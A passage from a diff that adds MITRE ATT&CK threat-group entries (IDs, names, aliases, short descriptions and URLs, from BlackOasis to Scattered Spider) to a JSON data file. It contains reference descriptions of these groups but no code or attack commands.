+      "url": "https://attack.mitre.org/groups/G1043/"
+    },
+    {
+      "id": "G0063",
+      "name": "BlackOasis",
+      "aliases": "",
+      "desc": "BlackOasis is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition ...",
+      "url": "https://attack.mitre.org/groups/G0063/"
+    },
+    {
+      "id": "G0098",
+      "name": "BlackTech",
+      "aliases": "Palmerworm",
+      "desc": "BlackTech is a suspected Chinese cyber espionage group that has primarily targeted organizations in East Asia--particularly Taiwan, Japan, and Hong Kong--and the US since at least 2013. BlackTech ...",
+      "url": "https://attack.mitre.org/groups/G0098/"
+    },
+    {
+      "id": "G0108",
+      "name": "Blue Mockingbird",
+      "aliases": "",
+      "desc": "Blue Mockingbird is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird ...",
+      "url": "https://attack.mitre.org/groups/G0108/"
+    },
+    {
+      "id": "G0097",
+      "name": "Bouncing Golf",
+      "aliases": "",
+      "desc": "Bouncing Golf is a cyberespionage campaign targeting Middle Eastern countries.",
+      "url": "https://attack.mitre.org/groups/G0097/"
+    },
+    {
+      "id": "G0060",
+      "name": "BRONZE BUTLER",
+      "aliases": "REDBALDKNIGHT, Tick",
+      "desc": "BRONZE BUTLER is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government ...",
+      "url": "https://attack.mitre.org/groups/G0060/"
+    },
+    {
+      "id": "G0008",
+      "name": "Carbanak",
+      "aliases": "Anunak",
+      "desc": "Carbanak is a cybercriminal group that has used Carbanak malware to target financial institutions since at least 2013. Carbanak may be linked to groups tracked separately as Cobalt Group and FIN7 ...",
+      "url": "https://attack.mitre.org/groups/G0008/"
+    },
+    {
+      "id": "G0114",
+      "name": "Chimera",
+      "aliases": "",
+      "desc": "Chimera is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry.",
+      "url": "https://attack.mitre.org/groups/G0114/"
+    },
+    {
+      "id": "G1021",
+      "name": "Cinnamon Tempest",
+      "aliases": "DEV-0401, Emperor Dragonfly, BRONZE STARLIGHT",
+      "desc": "Cinnamon Tempest is a China-based threat group that has been active since at least 2021 deploying multiple strains of ransomware based on the leaked Babuk source code. Cinnamon Tempest does not ...",
+      "url": "https://attack.mitre.org/groups/G1021/"
+    },
+    {
+      "id": "G0003",
+      "name": "Cleaver",
+      "aliases": "Threat Group 2889, TG-2889",
+      "desc": "Cleaver is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver. Strong circumstantial evidence suggests Cleaver is linked to ...",
+      "url": "https://attack.mitre.org/groups/G0003/"
+    },
+    {
+      "id": "G0080",
+      "name": "Cobalt Group",
+      "aliases": "GOLD KINGSWOOD, Cobalt Gang, Cobalt Spider",
+      "desc": "Threat Group Cobalt Group (G0080)",
+      "url": "https://attack.mitre.org/groups/G0080/"
+    },
+    {
+      "id": "G0142",
+      "name": "Confucius",
+      "aliases": "Confucius APT",
+      "desc": "Confucius is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013 ...",
+      "url": "https://attack.mitre.org/groups/G0142/"
+    },
+    {
+      "id": "G1052",
+      "name": "Contagious Interview",
+      "aliases": "DeceptiveDevelopment, Gwisin Gang, Tenacious Pungsan, DEV#POPPER, PurpleBravo, TAG-121",
+      "desc": "Contagious Interview is a North Korea–aligned threat group active since 2023. The group conducts both cyberespionage and financially motivated operations, including the theft of cryptocurrency and ...",
+      "url": "https://attack.mitre.org/groups/G1052/"
+    },
+    {
+      "id": "G0052",
+      "name": "CopyKittens",
+      "aliases": "",
+      "desc": "CopyKittens is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The ...",
+      "url": "https://attack.mitre.org/groups/G0052/"
+    },
+    {
+      "id": "G1012",
+      "name": "CURIUM",
+      "aliases": "Crimson Sandstorm, TA456, Tortoise Shell, Yellow Liderc",
+      "desc": "CURIUM is an Iranian threat group, first reported in September 2019 and active since at least July 2018, targeting IT service providers in the Middle East. CURIUM has since invested in building ...",
+      "url": "https://attack.mitre.org/groups/G1012/"
+    },
+    {
+      "id": "G1027",
+      "name": "CyberAv3ngers",
+      "aliases": "Soldiers of Soloman",
+      "desc": "Threat Group CyberAv3ngers (G1027)",
+      "url": "https://attack.mitre.org/groups/G1027/"
+    },
+    {
+      "id": "G1034",
+      "name": "Daggerfly",
+      "aliases": "Evasive Panda, BRONZE HIGHLAND",
+      "desc": "Daggerfly is a People's Republic of China-linked APT entity active since at least 2012. Daggerfly has targeted individuals, government and NGO entities, and telecommunication companies in Asia and ...",
+      "url": "https://attack.mitre.org/groups/G1034/"
+    },
+    {
+      "id": "G0070",
+      "name": "Dark Caracal",
+      "aliases": "",
+      "desc": "Dark Caracal is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012.",
+      "url": "https://attack.mitre.org/groups/G0070/"
+    },
+    {
+      "id": "G0012",
+      "name": "Darkhotel",
+      "aliases": "DUBNIUM, Zigzag Hail",
+      "desc": "Darkhotel is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel ...",
+      "url": "https://attack.mitre.org/groups/G0012/"
+    },
+    {
+      "id": "G0079",
+      "name": "DarkHydrus",
+      "aliases": "",
+      "desc": "DarkHydrus is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom ...",
+      "url": "https://attack.mitre.org/groups/G0079/"
+    },
+    {
+      "id": "G0105",
+      "name": "DarkVishnya",
+      "aliases": "",
+      "desc": "DarkVishnya is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.",
+      "url": "https://attack.mitre.org/groups/G0105/"
+    },
+    {
+      "id": "G0009",
+      "name": "Deep Panda",
+      "aliases": "Shell Crew, WebMasters, KungFu Kittens, PinkPanther, Black Vine",
+      "desc": "Threat Group Deep Panda (G0009)",
+      "url": "https://attack.mitre.org/groups/G0009/"
+    },
+    {
+      "id": "G0035",
+      "name": "Dragonfly",
+      "aliases": "TEMP.Isotope, DYMALLOY, Berserk Bear, TG-4192, Crouching Yeti, IRON LIBERTY, Energetic Bear, Ghost Blizzard, BROMINE",
+      "desc": "Dragonfly is a cyber espionage group that has been attributed to Russia's Federal Security Service (FSB) Center 16. Active since at least 2010, Dragonfly has targeted defense and aviation ...",
+      "url": "https://attack.mitre.org/groups/G0035/"
+    },
+    {
+      "id": "G0017",
+      "name": "DragonOK",
+      "aliases": "",
+      "desc": "DragonOK is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, DragonOK is thought to have a direct or indirect ...",
+      "url": "https://attack.mitre.org/groups/G0017/"
+    },
+    {
+      "id": "G1006",
+      "name": "Earth Lusca",
+      "aliases": "TAG-22, Charcoal Typhoon, CHROMIUM, ControlX",
+      "desc": "Threat Group Earth Lusca (G1006)",
+      "url": "https://attack.mitre.org/groups/G1006/"
+    },
+    {
+      "id": "G0066",
+      "name": "Elderwood",
+      "aliases": "Elderwood Gang, Beijing Group, Sneaky Panda",
+      "desc": "Elderwood is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora. The group has targeted defense organizations, supply ...",
+      "url": "https://attack.mitre.org/groups/G0066/"
+    },
+    {
+      "id": "G1003",
+      "name": "Ember Bear",
+      "aliases": "UNC2589, Bleeding Bear, DEV-0586, Cadet Blizzard, Frozenvista, UAC-0056",
+      "desc": "Threat Group Ember Bear (G1003)",
+      "url": "https://attack.mitre.org/groups/G1003/"
+    },
+    {
+      "id": "G0020",
+      "name": "Equation",
+      "aliases": "",
+      "desc": "Equation is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard ...",
+      "url": "https://attack.mitre.org/groups/G0020/"
+    },
+    {
+      "id": "G0120",
+      "name": "Evilnum",
+      "aliases": "",
+      "desc": "Evilnum is a financially motivated threat group that has been active since at least 2018.",
+      "url": "https://attack.mitre.org/groups/G0120/"
+    },
+    {
+      "id": "G1011",
+      "name": "EXOTIC LILY",
+      "aliases": "",
+      "desc": "EXOTIC LILY is a financially motivated group that has been closely linked with Wizard Spider and the deployment of ransomware including Conti and Diavol. EXOTIC LILY may be acting as an initial ...",
+      "url": "https://attack.mitre.org/groups/G1011/"
+    },
+    {
+      "id": "G0137",
+      "name": "Ferocious Kitten",
+      "aliases": "",
+      "desc": "Ferocious Kitten is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015.",
+      "url": "https://attack.mitre.org/groups/G0137/"
+    },
+    {
+      "id": "G0051",
+      "name": "FIN10",
+      "aliases": "",
+      "desc": "FIN10 is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort ...",
+      "url": "https://attack.mitre.org/groups/G0051/"
+    },
+    {
+      "id": "G1016",
+      "name": "FIN13",
+      "aliases": "Elephant Beetle",
+      "desc": "FIN13 is a financially motivated cyber threat group that has targeted the financial, retail, and hospitality industries in Mexico and Latin America, as early as 2016. FIN13 achieves its objectives ...",
+      "url": "https://attack.mitre.org/groups/G1016/"
+    },
+    {
+      "id": "G0085",
+      "name": "FIN4",
+      "aliases": "",
+      "desc": "FIN4 is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies ...",
+      "url": "https://attack.mitre.org/groups/G0085/"
+    },
+    {
+      "id": "G0053",
+      "name": "FIN5",
+      "aliases": "",
+      "desc": "FIN5 is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the ...",
+      "url": "https://attack.mitre.org/groups/G0053/"
+    },
+    {
+      "id": "G0037",
+      "name": "FIN6",
+      "aliases": "Magecart Group 6, ITG08, Skeleton Spider, TAAL, Camouflage Tempest",
+      "desc": "FIN6 is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems ...",
+      "url": "https://attack.mitre.org/groups/G0037/"
+    },
+    {
+      "id": "G0046",
+      "name": "FIN7",
+      "aliases": "GOLD NIAGARA, ITG14, Carbon Spider, ELBRUS, Sangria Tempest",
+      "desc": "Threat Group FIN7 (G0046)",
+      "url": "https://attack.mitre.org/groups/G0046/"
+    },
+    {
+      "id": "G0061",
+      "name": "FIN8",
+      "aliases": "Syssphinx",
+      "desc": "FIN8 is a financially motivated threat group that has been active since at least January 2016, and known for targeting organizations in the hospitality, retail, entertainment, insurance ...",
+      "url": "https://attack.mitre.org/groups/G0061/"
+    },
+    {
+      "id": "G0117",
+      "name": "Fox Kitten",
+      "aliases": "UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm",
+      "desc": "Fox Kitten is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North ...",
+      "url": "https://attack.mitre.org/groups/G0117/"
+    },
+    {
+      "id": "G0093",
+      "name": "GALLIUM",
+      "aliases": "Granite Typhoon",
+      "desc": "GALLIUM is a cyberespionage group that has been active since at least 2012, primarily targeting telecommunications companies, financial institutions, and government entities in Afghanistan ...",
+      "url": "https://attack.mitre.org/groups/G0093/"
+    },
+    {
+      "id": "G0084",
+      "name": "Gallmaker",
+      "aliases": "",
+      "desc": "Gallmaker is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military ...",
+      "url": "https://attack.mitre.org/groups/G0084/"
+    },
+    {
+      "id": "G0047",
+      "name": "Gamaredon Group",
+      "aliases": "IRON TILDEN, Primitive Bear, ACTINIUM, Armageddon, Shuckworm, DEV-0157, Aqua Blizzard, NastyShrew",
+      "desc": "Gamaredon Group is a suspected Russian cyber espionage group that has targeted military, law enforcement, judiciary, non-profit, and non-governmental organizations in Ukraine since at least 2013 ...",
+      "url": "https://attack.mitre.org/groups/G0047/"
+    },
+    {
+      "id": "G0036",
+      "name": "GCMAN",
+      "aliases": "",
+      "desc": "GCMAN is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services.",
+      "url": "https://attack.mitre.org/groups/G0036/"
+    },
+    {
+      "id": "G0115",
+      "name": "GOLD SOUTHFIELD",
+      "aliases": "Pinchy Spider",
+      "desc": "GOLD SOUTHFIELD is a financially motivated threat group active since at least 2018 that operates the REvil Ransomware-as-a Service (RaaS). GOLD SOUTHFIELD provides backend infrastructure for ...",
+      "url": "https://attack.mitre.org/groups/G0115/"
+    },
+    {
+      "id": "G0078",
+      "name": "Gorgon Group",
+      "aliases": "",
+      "desc": "Gorgon Group is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks ...",
+      "url": "https://attack.mitre.org/groups/G0078/"
+    },
+    {
+      "id": "G0043",
+      "name": "Group5",
+      "aliases": "",
+      "desc": "Group5 is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and ...",
+      "url": "https://attack.mitre.org/groups/G0043/"
+    },
+    {
+      "id": "G0125",
+      "name": "HAFNIUM",
+      "aliases": "Operation Exchange Marauder, Silk Typhoon",
+      "desc": "HAFNIUM is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. HAFNIUM primarily targets entities in the US across a number of ...",
+      "url": "https://attack.mitre.org/groups/G0125/"
+    },
+    {
+      "id": "G1001",
+      "name": "HEXANE",
+      "aliases": "Lyceum, Siamesekitten, Spirlin",
+      "desc": "HEXANE is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been ...",
+      "url": "https://attack.mitre.org/groups/G1001/"
+    },
+    {
+      "id": "G0126",
+      "name": "Higaisa",
+      "aliases": "",
+      "desc": "Higaisa is a threat group suspected to have South Korean origins. Higaisa has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in ...",
+      "url": "https://attack.mitre.org/groups/G0126/"
+    },
+    {
+      "id": "G1032",
+      "name": "INC Ransom",
+      "aliases": "GOLD IONIC",
+      "desc": "INC Ransom is a ransomware and data extortion threat group associated with the deployment of INC Ransomware that has been active since at least July 2023. INC Ransom has targeted organizations ...",
+      "url": "https://attack.mitre.org/groups/G1032/"
+    },
+    {
+      "id": "G0100",
+      "name": "Inception",
+      "aliases": "Inception Framework, Cloud Atlas",
+      "desc": "Inception is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United ...",
+      "url": "https://attack.mitre.org/groups/G0100/"
+    },
+    {
+      "id": "G0136",
+      "name": "IndigoZebra",
+      "aliases": "",
+      "desc": "IndigoZebra is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014.",
+      "url": "https://attack.mitre.org/groups/G0136/"
+    },
+    {
+      "id": "G0119",
+      "name": "Indrik Spider",
+      "aliases": "Evil Corp, Manatee Tempest, DEV-0243, UNC2165",
+      "desc": "Indrik Spider is a Russia-based cybercriminal group that has been active since at least 2014. Indrik Spider initially started with the Dridex banking Trojan, and then by 2017 they began running ...",
+      "url": "https://attack.mitre.org/groups/G0119/"
+    },
+    {
+      "id": "G0004",
+      "name": "Ke3chang",
+      "aliases": "APT15, Mirage, Vixen Panda, GREF, Playful Dragon, RoyalAPT, NICKEL, Nylon Typhoon",
+      "desc": "Ke3chang is a threat group attributed to actors operating out of China. Ke3chang has targeted oil, government, diplomatic, military, and NGOs in Central and South America, the Caribbean, Europe ...",
+      "url": "https://attack.mitre.org/groups/G0004/"
+    },
+    {
+      "id": "G0094",
+      "name": "Kimsuky",
+      "aliases": "Black Banshee, Velvet Chollima, Emerald Sleet, THALLIUM, APT43, TA427, Springtail, Earth Kumiho, PatheticSlug",
+      "desc": "Threat Group Kimsuky (G0094)",
+      "url": "https://attack.mitre.org/groups/G0094/"
+    },
+    {
+      "id": "G1004",
+      "name": "LAPSUS$",
+      "aliases": "DEV-0537, Strawberry Tempest",
+      "desc": "LAPSUS$ is cyber criminal threat group that has been active since at least mid-2021. LAPSUS$ specializes in large-scale social engineering and extortion operations, including destructive attacks ...",
+      "url": "https://attack.mitre.org/groups/G1004/"
+    },
+    {
+      "id": "G0032",
+      "name": "Lazarus Group",
+      "aliases": "Labyrinth Chollima, HIDDEN COBRA, Guardians of Peace, ZINC, NICKEL ACADEMY, Diamond Sleet",
+      "desc": "Threat Group Lazarus Group (G0032)",
+      "url": "https://attack.mitre.org/groups/G0032/"
+    },
+    {
+      "id": "G0140",
+      "name": "LazyScripter",
+      "aliases": "",
+      "desc": "LazyScripter is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets.",
+      "url": "https://attack.mitre.org/groups/G0140/"
+    },
+    {
+      "id": "G0077",
+      "name": "Leafminer",
+      "aliases": "Raspite",
+      "desc": "Leafminer is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017.",
+      "url": "https://attack.mitre.org/groups/G0077/"
+    },
+    {
+      "id": "G0065",
+      "name": "Leviathan",
+      "aliases": "MUDCARP, Kryptonite Panda, Gadolinium, BRONZE MOHAWK, TEMP.Jumper, APT40, TEMP.Periscope, Gingham Typhoon",
+      "desc": "Leviathan is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company ...",
+      "url": "https://attack.mitre.org/groups/G0065/"
+    },
+    {
+      "id": "G0030",
+      "name": "Lotus Blossom",
+      "aliases": "DRAGONFISH, Spring Dragon, RADIUM, Raspberry Typhoon, Bilbug, Thrip",
+      "desc": "Lotus Blossom is a long-standing threat group largely targeting various entities in Asia since at least 2009. In addition to government and related targets, Lotus Blossom has also targeted ...",
+      "url": "https://attack.mitre.org/groups/G0030/"
+    },
+    {
+      "id": "G1014",
+      "name": "LuminousMoth",
+      "aliases": "",
+      "desc": "LuminousMoth is a Chinese-speaking cyber espionage group that has been active since at least October 2020. LuminousMoth has targeted high-profile organizations, including government entities, in ...",
+      "url": "https://attack.mitre.org/groups/G1014/"
+    },
+    {
+      "id": "G0095",
+      "name": "Machete",
+      "aliases": "APT-C-43, El Machete",
+      "desc": "Machete is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on ...",
+      "url": "https://attack.mitre.org/groups/G0095/"
+    },
+    {
+      "id": "G0059",
+      "name": "Magic Hound",
+      "aliases": "TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster, APT35, Mint Sandstorm",
+      "desc": "Magic Hound is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have ...",
+      "url": "https://attack.mitre.org/groups/G0059/"
+    },
+    {
+      "id": "G1026",
+      "name": "Malteiro",
+      "aliases": "",
+      "desc": "Malteiro is a financially motivated criminal group that is likely based in Brazil and has been active since at least November 2019. The group operates and distributes the Mispadu banking trojan ...",
+      "url": "https://attack.mitre.org/groups/G1026/"
+    },
+    {
+      "id": "G1051",
+      "name": "Medusa Group",
+      "aliases": "",
+      "desc": "Threat Group Medusa Group (G1051)",
+      "url": "https://attack.mitre.org/groups/G1051/"
+    },
+    {
+      "id": "G0045",
+      "name": "menuPass",
+      "aliases": "Cicada, POTASSIUM, Stone Panda, APT10, Red Apollo, CVNX, HOGFISH, BRONZE RIVERSIDE",
+      "desc": "Threat Group menuPass (G0045)",
+      "url": "https://attack.mitre.org/groups/G0045/"
+    },
+    {
+      "id": "G1013",
+      "name": "Metador",
+      "aliases": "",
+      "desc": "Metador is a suspected cyber espionage group that was first reported in September 2022. Metador has targeted a limited number of telecommunication companies, internet service providers, and ...",
+      "url": "https://attack.mitre.org/groups/G1013/"
+    },
+    {
+      "id": "G1054",
+      "name": "MirrorFace",
+      "aliases": "Earth Kasha",
+      "desc": "MirrorFace is a People's Republic of China (PRC)-aligned cyberespionage actor believed to be a subgroup under the menuPass umbrella based on targeting, tools, and infrastructure overlaps ...",
+      "url": "https://attack.mitre.org/groups/G1054/"
+    },
+    {
+      "id": "G0002",
+      "name": "Moafee",
+      "aliases": "",
+      "desc": "Moafee is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect ...",
+      "url": "https://attack.mitre.org/groups/G0002/"
+    },
+    {
+      "id": "G0103",
+      "name": "Mofang",
+      "aliases": "",
+      "desc": "Mofang is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting ...",
+      "url": "https://attack.mitre.org/groups/G0103/"
+    },
+    {
+      "id": "G0021",
+      "name": "Molerats",
+      "aliases": "Operation Molerats, Gaza Cybergang",
+      "desc": "Molerats is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.",
+      "url": "https://attack.mitre.org/groups/G0021/"
+    },
+    {
+      "id": "G1036",
+      "name": "Moonstone Sleet",
+      "aliases": "Storm-1789",
+      "desc": "Moonstone Sleet is a North Korean-linked threat actor executing both financially motivated attacks and espionage operations. The group previously overlapped significantly with another North Korean ...",
+      "url": "https://attack.mitre.org/groups/G1036/"
+    },
+    {
+      "id": "G1009",
+      "name": "Moses Staff",
+      "aliases": "DEV-0500, Marigold Sandstorm",
+      "desc": "Threat Group Moses Staff (G1009)",
+      "url": "https://attack.mitre.org/groups/G1009/"
+    },
+    {
+      "id": "G1019",
+      "name": "MoustachedBouncer",
+      "aliases": "",
+      "desc": "MoustachedBouncer is a cyberespionage group that has been active since at least 2014 targeting foreign embassies in Belarus.",
+      "url": "https://attack.mitre.org/groups/G1019/"
+    },
+    {
+      "id": "G0069",
+      "name": "MuddyWater",
+      "aliases": "Earth Vetala, MERCURY, Static Kitten, Seedworm, TEMP.Zagros, Mango Sandstorm, TA450, MuddyKrill",
+      "desc": "Threat Group MuddyWater (G0069)",
+      "url": "https://attack.mitre.org/groups/G0069/"
+    },
+    {
+      "id": "G0129",
+      "name": "Mustang Panda",
+      "aliases": "TA416, RedDelta, BRONZE PRESIDENT, STATELY TAURUS, FIREANT, CAMARO DRAGON, EARTH PRETA, HIVE0154, TWILL TYPHOON, TANTALUM, LUMINOUS MOTH, UNC6384, TEMP.Hex, Red Lich, ClumsyToad",
+      "desc": "Mustang Panda is a China-based cyber espionage threat actor that has been conducting operations since at least 2012. Mustang Panda has been known to use tailored phishing lures and decoy documents ...",
+      "url": "https://attack.mitre.org/groups/G0129/"
+    },
+    {
+      "id": "G1020",
+      "name": "Mustard Tempest",
+      "aliases": "DEV-0206, TA569, GOLD PRELUDE, UNC1543",
+      "desc": "Mustard Tempest is an initial access broker that has operated the SocGholish distribution network since at least 2017. Mustard Tempest has partnered with Indrik Spider to provide access for the ...",
+      "url": "https://attack.mitre.org/groups/G1020/"
+    },
+    {
+      "id": "G0019",
+      "name": "Naikon",
+      "aliases": "",
+      "desc": "Threat Group Naikon (G0019)",
+      "url": "https://attack.mitre.org/groups/G0019/"
+    },
+    {
+      "id": "G0055",
+      "name": "NEODYMIUM",
+      "aliases": "",
+      "desc": "NEODYMIUM is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called PROMETHIUM due ...",
+      "url": "https://attack.mitre.org/groups/G0055/"
+    },
+    {
+      "id": "G1059",
+      "name": "NIMBUS MANTICORE",
+      "aliases": "UNC1549, TA455, COBALT SMOKEY",
+      "desc": "Threat Group NIMBUS MANTICORE (G1059)",
+      "url": "https://attack.mitre.org/groups/G1059/"
+    },
+    {
+      "id": "G0133",
+      "name": "Nomadic Octopus",
+      "aliases": "DustSquad",
+      "desc": "Nomadic Octopus is a Russian-speaking cyber espionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014 ...",
+      "url": "https://attack.mitre.org/groups/G0133/"
+    },
+    {
+      "id": "G0049",
+      "name": "OilRig",
+      "aliases": "COBALT GYPSY, IRN2, APT34, Helix Kitten, Evasive Serpens, Hazel Sandstorm, EUROPIUM, ITG13, Earth Simnavaz, Crambus, TA452",
+      "desc": "OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial ...",
+      "url": "https://attack.mitre.org/groups/G0049/"
+    },
+    {
+      "id": "G0071",
+      "name": "Orangeworm",
+      "aliases": "",
+      "desc": "Orangeworm is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage. Reverse ...",
+      "url": "https://attack.mitre.org/groups/G0071/"
+    },
+    {
+      "id": "G0040",
+      "name": "Patchwork",
+      "aliases": "Hangover Group, Dropping Elephant, Chinastrats, MONSOON, Operation Hangover",
+      "desc": "Patchwork is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian ...",
+      "url": "https://attack.mitre.org/groups/G0040/"
+    },
+    {
+      "id": "G0011",
+      "name": "PittyTiger",
+      "aliases": "",
+      "desc": "PittyTiger is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.",
+      "url": "https://attack.mitre.org/groups/G0011/"
+    },
+    {
+      "id": "G0068",
+      "name": "PLATINUM",
+      "aliases": "",
+      "desc": "PLATINUM is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia.",
+      "url": "https://attack.mitre.org/groups/G0068/"
+    },
+    {
+      "id": "G1040",
+      "name": "Play",
+      "aliases": "",
+      "desc": "Play is a ransomware group that has been active since at least 2022 deploying Playcrypt ransomware against the business, government, critical infrastructure, healthcare, and media sectors in North ...",
+      "url": "https://attack.mitre.org/groups/G1040/"
+    },
+    {
+      "id": "G1005",
+      "name": "POLONIUM",
+      "aliases": "Plaid Rain",
+      "desc": "POLONIUM is a Lebanon-based group that has primarily targeted Israeli organizations, including critical manufacturing, information technology, and defense industry companies, since at least ...",
+      "url": "https://attack.mitre.org/groups/G1005/"
+    },
+    {
+      "id": "G0033",
+      "name": "Poseidon Group",
+      "aliases": "",
+      "desc": "Poseidon Group is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies ...",
+      "url": "https://attack.mitre.org/groups/G0033/"
+    },
+    {
+      "id": "G0056",
+      "name": "PROMETHIUM",
+      "aliases": "StrongPity",
+      "desc": "PROMETHIUM is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. PROMETHIUM has ...",
+      "url": "https://attack.mitre.org/groups/G0056/"
+    },
+    {
+      "id": "G0024",
+      "name": "Putter Panda",
+      "aliases": "APT2, MSUpdater",
+      "desc": "Putter Panda is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA's 3rd General Staff Department (GSD).",
+      "url": "https://attack.mitre.org/groups/G0024/"
+    },
+    {
+      "id": "G0075",
+      "name": "Rancor",
+      "aliases": "",
+      "desc": "Rancor is a threat group that has led targeted campaigns against the South East Asia region. Rancor uses politically-motivated lures to entice victims to open malicious documents.",
+      "url": "https://attack.mitre.org/groups/G0075/"
+    },
+    {
+      "id": "G1039",
+      "name": "RedCurl",
+      "aliases": "",
+      "desc": "RedCurl is a threat actor active since 2018 notable for corporate espionage targeting a variety of locations, including Ukraine, Canada and the United Kingdom, and a variety of industries ...",
+      "url": "https://attack.mitre.org/groups/G1039/"
+    },
+    {
+      "id": "G1042",
+      "name": "RedEcho",
+      "aliases": "",
+      "desc": "RedEcho is a People's Republic of China-related threat actor associated with long-running intrusions in Indian critical infrastructure entities. RedEcho overlaps with various other PRC-linked ...",
+      "url": "https://attack.mitre.org/groups/G1042/"
+    },
+    {
+      "id": "G0106",
+      "name": "Rocke",
+      "aliases": "",
+      "desc": "Rocke is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name Rocke ...",
+      "url": "https://attack.mitre.org/groups/G0106/"
+    },
+    {
+      "id": "G0048",
+      "name": "RTM",
+      "aliases": "",
+      "desc": "RTM is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by ...",
+      "url": "https://attack.mitre.org/groups/G0048/"
+    },
+    {
+      "id": "G1031",
+      "name": "Saint Bear",
+      "aliases": "Storm-0587, TA471, UAC-0056, Lorec53",
+      "desc": "Saint Bear is a Russian-nexus threat actor active since early 2021, primarily targeting entities in Ukraine and Georgia. The group is notable for a specific remote access tool, Saint Bot, and ...",
+      "url": "https://attack.mitre.org/groups/G1031/"
+    },
+    {
+      "id": "G1045",
+      "name": "Salt Typhoon",
+      "aliases": "",
+      "desc": "Salt Typhoon is a People's Republic of China (PRC) state-backed actor that has been active since at least 2019 and responsible for numerous compromises of network infrastructure at major U.S. ...",
+      "url": "https://attack.mitre.org/groups/G1045/"
+    },
+    {
+      "id": "G0034",
+      "name": "Sandworm Team",
+      "aliases": "ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, Voodoo Bear, IRIDIUM, Seashell Blizzard, FROZENBARENTS, APT44",
+      "desc": "Threat Group Sandworm Team (G0034)",
+      "url": "https://attack.mitre.org/groups/G0034/"
+    },
+    {
+      "id": "G0029",
+      "name": "Scarlet Mimic",
+      "aliases": "",
+      "desc": "Scarlet Mimic is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with ...",
+      "url": "https://attack.mitre.org/groups/G0029/"
+    },
+    {
+      "id": "G1015",
+      "name": "Scattered Spider",
